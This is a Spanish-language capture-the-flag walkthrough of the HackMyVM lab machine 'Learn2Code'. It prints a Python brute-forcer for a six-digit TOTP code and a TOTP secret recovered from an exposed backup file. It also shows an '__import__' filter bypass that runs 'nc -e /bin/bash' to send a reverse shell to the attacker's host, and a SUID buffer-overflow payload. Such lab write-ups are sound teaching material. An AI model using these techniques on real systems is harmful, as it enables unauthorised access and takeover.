---
layout: post
title: Learn2Code
date: 2023-04-14
author: BlackCage
categories: [HackMyVM]
tags: [HMV, Enumeration, BOF]
---

# Learn2Code [ Hack My VM ]
![light mode only](/assets/img/imgs/learn2code/logo.jpg){: .light }
![dark mode only](/assets/img/imgs/learn2code/logo_black.png){: .dark }

# Reconocimiento
### NMAP
```
# Nmap 7.93 scan initiated Thu Apr 13 11:09:56 2023 as: nmap -sCV -p80 -oN targeted 192.168.1.114
Nmap scan report for 192.168.1.114
Host is up (0.00039s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Access system
MAC Address: 08:00:27:EC:2D:75 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 13 11:10:16 2023 -- 1 IP address (1 host up) scanned in 19.65 seconds
```

Solo vemos el puerto `80`, por lo que no hará falta buscar potenciales usuarios.

### Inspección Manual
![index](/assets/img/imgs/learn2code/index.png)

Vemos que necesitamos un código para acceder a la página, por desgracia no lo sabemos. Vamos a ver el código fuente a ver si nos dan alguna pista:

```html
<input type="number" class="form-control text-center" min-length="6" max-length="6" id="code" name="code">
```

En la línea 27 nos encontramos con esta porción de código, está definiendo el mínimo y el máximo de caracteres.

Ya sabemos que el código es de seis caracteres, vamos a ver si podemos descrifrarlo con fuerza bruta.

### Fuerza Bruta
Para este paso me hice un `script` en `Python`, vamos a verlo:

```python
import requests

with open("wordlist", "r") as numbers:
        lines = numbers.readlines()
        for number in lines:
                number = number.replace("\n", "")

                headers = {
                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
                        'Accept': '*/*',
                        'Accept-Language': 'en-US,en;q=0.5',
                        # 'Accept-Encoding': 'gzip, deflate',
                        'Content-type': 'application/x-www-form-urlencoded',
                        'Origin': 'http://192.168.1.114',
                        'Connection': 'keep-alive',
                        'Referer': 'http://192.168.1.114/',
                }

                data = {
                        'action': 'check_code',
                        'code': f'{number}',
                }

                r = requests.post('http://192.168.1.106/includes/php/access.php', headers=headers, data=data)
                if not "wrong" in str(r.content):
                        print(f"Found Code: {number}")
                        break
                else:
                        print(f"{number}", end="\r")
```

Este `script` irá iterando por un diccionario que previamente he creado con **Crunch**:

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Learn2Code/scripts]
└─# crunch 6 6 0123456789 -o wordlist
Crunch will now generate the following amount of data: 7000000 bytes
6 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 1000000 

crunch: 100% completed generating output
```

¡Bien! Ya tenemos todo lo necesario para hacer fuerza bruta sobre el código, ahora sólo toca esperar a que lo encuentre.

Tras un rato de espera obtenemos el siguiente resultado (el código no es siempre el mismo):

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Learn2Code/scripts]
└─# python3 brute_force.py
Found Code: 069112
```

¡Estupendo! Ya tenemos el código, aunque hay una manera más fácil de obtenerlo.

### Alternativa Código
Nunca viene mal saber otras maneras para obtener el mismo resultado.

Si miramos la petición que se hace a la hora de enviar un código veremos lo siguiente:

![request](/assets/img/imgs/learn2code/request.png)

Se está tramitando una petición `POST` al fichero `access.php` en la ruta `/includes/php/`{: .filepath }, vamos a inspeccionarla manualmente:

![files](/assets/img/imgs/learn2code/files.png)

Veremos que nos encontramos con varios ficheros en `PHP`, pero uno de ellos es un **backup**, es decir, lo han creado por si algo pasa. Vamos a descarganos el fichero:

```php
<?php
        require_once 'GoogleAuthenticator.php';
        $ga = new PHPGangsta_GoogleAuthenticator();
        $secret = "S4I22IG3KHZIGQCJ";

        if ($_POST['action'] == 'check_code') {
                $code = $_POST['code'];
                $result = $ga->verifyCode($secret, $code, 1);

                if ($result) {
                        include('coder.php');
                } else {
                        echo "wrong";
                }
        }
?>
```

En pocas palabras, está llamando a la clase `PHPGangsta_GoogleAuthenticator` localizada en el fichero `GoogleAuthenticator.php`, el cual no disponemos.

Después hace una simple comparación con nuestra entrada y el código que le ha dado el fichero `PHP` determina si dejarnos entrar o no.

Para poder explotarlo necesitamos tener el fichero `GoogleAuthenticator.php`, el cual tras una búsqueda lo encontré en [GitHub](https://raw.githubusercontent.com/PHPGangsta/GoogleAuthenticator/master/PHPGangsta/GoogleAuthenticator.php).

Una vez ya tengamos el fichero necesitamos editar el código de  `access.php.bak` (tenéis que cambiarle el nombre a `access.php`):

```php
<?php
        require_once 'GoogleAuthenticator.php';
        $ga = new PHPGangsta_GoogleAuthenticator();
        $secret = "S4I22IG3KHZIGQCJ";
        $code = $ga->getCode($secret);
        echo $code
?>
```

Lo que estamos haciendo es llamar a la función `getCode` pasándole la clave secreta como argumento. Por último mostramos el código en pantalla.

```sh
┌──(root㉿kali)-[~/…/VMs/HMV/Learn2Code/content]
└─# php access.php
448248
```

¡Estupendo! Ya sabemos otra manera de obtener el mismo resultado.

# Movimiento Lateral
### Shell
Una vez hayamos puesto el código nos llevará a la siguiente página:

![code](/assets/img/imgs/learn2code/code.png)

Tras estar un rato probando llegué a la conclusión de que podemos programar en `Python2`.

Si intentamos importar librearías nos dirá que no tratemos de inyectar código malicioso y no nos dejará ejecutarlo, pero podemos importar librerías de otra manera.

Si utilizamos `__import__('os')` no nos dará error, ya que está mirando si comienza con `import`.

Para poder explotar este error debemos ponernos en escucha en nuestro equipo, ya que enviaremos una `Shell`. En mi caso será por el puerto `4444`:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Learn2Code]
└─# nc -nlvp 4444               
listening on [any] 4444 ...
```

Con esto hecho solo nos queda crear una línea en `Python` para enviarnos la `Shell`, para ello utilicé la siguiente línea:

```python
__import__('os').popen('nc -e /bin/bash 192.168.1.105 4444').read()
```

Instantáneamente recibiremos la conexión en nuestro equipo:

```sh
┌──(root㉿kali)-[~/Desktop/VMs/HMV/Learn2Code]
└─# nc -nlvp 4444               
listening on [any] 4444 ...
connect to [192.168.1.105] from (UNKNOWN) [192.168.1.106] 56380
www-data@Learn2Code:/var/www/html/includes/php$
```

¡Bien! Ya estamos como **www-data** en la máquina.

### Subida de privilegios #1
Para esta subida de privilegios necesitamos tener un mínimo conocimiento en **Buffer Overflow**, vamos a ver cómo podemos escalar privilegios.

Lo primero que hice fue buscar por binarios con permisos `SUID`:

```sh
www-data@Learn2Code:/$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/bin/chsh
/usr/bin/mount
/usr/bin/passwd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/MakeMeLearner
/usr/bin/chfn
```

Vemos un binario algo extraño llamado `MakeMeLearner`, vamos a ejecutarlo y ver qué pasa:

```sh
www-data@Learn2Code:/$ /usr/bin/MakeMeLearner
MakeMeLearner: please specify an argument

www-data@Learn2Code:/$ /usr/bin/MakeMeLearner test
Change the 'modified' variable value to '0x61626364' to be a learnerTry again, you got 0x00000000
```

Nos dice que tenemos que cambiar nuestro `input` para que valga `0x61626364` y así ser **Learner** (un usuario).

Vamos a llevarnos el fichero a nuestra máquina para poder analizarlo.

Con **GHidra** decompilé la función `main` para ver el código:

![makemelearner-code](/assets/img/imgs/learn2code/makemelearner_code.png)

Vemos que la variable `local_58` aguanta hasta `76` `bytes` de información, también es la utilizada para hacer la comparación, por lo que sabemos que es el `input` del usuario.

Si miramos el fichero con `strings` nos encontramos una cadena bastante interesante:

![string](/assets/img/imgs/learn2code/string.png)

Si comparamos la cadena encontrada con la verificación que hace ("`0x61626364`" a texto) veremos que es la misma, por lo que necesitamos que la variable sea igual a `dcba`.

Para que el valor del `input` valga `dcba` tenemos que crear un `Segmentation Fault` para luego añadirle al final la cadena **`dcba`**, vamos a verlo:

```sh
www-data@Learn2Code:/$ /usr/bin/MakeMeLearner `python3 -c 'print("dcba"*20)'`
learner@Learn2Code:/$
```

¡Perfecto! Ya estamos como **Learner** en la máquina.

### Subida de privilegios #2
Este paso será algo más fácil de entender que el anterior, comencemos por ver qué hay en nuestro directorio personal:

```sh
learner@Learn2Code:/home/learner$ ls -la
total 44
dr-x------ 2 learner learner  4096 Sep 28  2020 .
drwxr-xr-x 3 root    root     4096 Sep 28  2020 ..
lrwxrwxrwx 1 root    root        9 Sep 28  2020 .bash_history -> /dev/null
-rw-r--r-- 1 learner learner   220 Sep 28  2020 .bash_logout
-rw-r--r-- 1 learner learner  3526 Sep 28  2020 .bashrc
-rw-r--r-- 1 learner learner   807 Sep 28  2020 .profile
-r-x------ 1 learner learner 16608 Sep 28  2020 MySecretPasswordVault
-r-------- 1 learner learner    14 Sep 28  2020 user.txt
```

Vemos un binario llamado `MySecretPasswordVault`, llevémoslo a nuestra máquina.

De nuevo, vamos a ver el código con **GHidra**, pero esta vez lo que nos importa es buscar algo semejante a una contraseña, ya que el código sin más no es relevante.

Tras un rato buscando nos encontramos con lo siguiente:

![passwd-ghidra](/assets/img/imgs/learn2code/passwd-ghidra.png)

Vemos una secuencia de caracteres, esto también se puede ver en **Nano**:

![passwd-nano](/assets/img/imgs/learn2code/passwd-nano.png)

Vamos a probar a ver si es la contraseña de `root`:

```sh
learner@Learn2Code:/home/learner$ su root
Password: NOI98hOIhj)(Jj
root@Learn2Code:/home/learner#
```

¡Enhorabuena! Hemos conseguido el **control total** de la máquina. ¡Qué fácil!